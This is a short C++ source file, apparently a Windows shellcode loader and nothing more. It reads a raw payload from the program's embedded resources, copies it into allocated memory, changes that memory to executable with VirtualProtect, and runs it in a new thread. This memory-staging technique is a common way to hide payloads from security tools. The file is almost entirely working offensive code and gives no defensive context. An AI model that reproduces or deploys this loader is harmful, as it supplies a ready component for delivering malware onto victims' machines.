#include <iostream>
#include <Windows.h>
#include "resource.h"

int main()
{
    unsigned char* shellcode;
    SIZE_T scSize;

    // Generate a resource.rc & resource.h poiting to a file of binary (raw) type shellcode
    // .rsrc storage && .rsrc payload extraction
    HRSRC res = FindResourceW(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
    HGLOBAL resHandle = LoadResource(NULL, res);
    shellcode = (unsigned char*)LockResource(resHandle);
    scSize = SizeofResource(NULL, res);

    //SIZE_T scSize = sizeof(shellcode);

    PVOID vAlloc = VirtualAlloc(0, scSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    printf("Mem : %p\n", vAlloc);
    
    if (!memmove(vAlloc, shellcode, scSize))
    {
        printf("RtlMoveMemory Failed: %d\n", GetLastError());
        return -1;
    };
   

    DWORD lpflOldProtect;
    if (!VirtualProtect(vAlloc, scSize, PAGE_EXECUTE_READ, &lpflOldProtect)) {
        printf("VirtualProtect Failed: %d\n", GetLastError());
        return -1;
    }


    HANDLE cThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)vAlloc, 0, 0, 0);
    if (!cThread) {
        printf("CreateThread Failed: %d\n", GetLastError());
        return -1;
    }

    if (WaitForSingleObject(cThread, INFINITE) == (WAIT_TIMEOUT | WAIT_FAILED)) {
        printf("WaitForSingleObject Failed: %d\n", GetLastError());
        return -1;
    }
    CloseHandle(cThread);
    return 0;
}
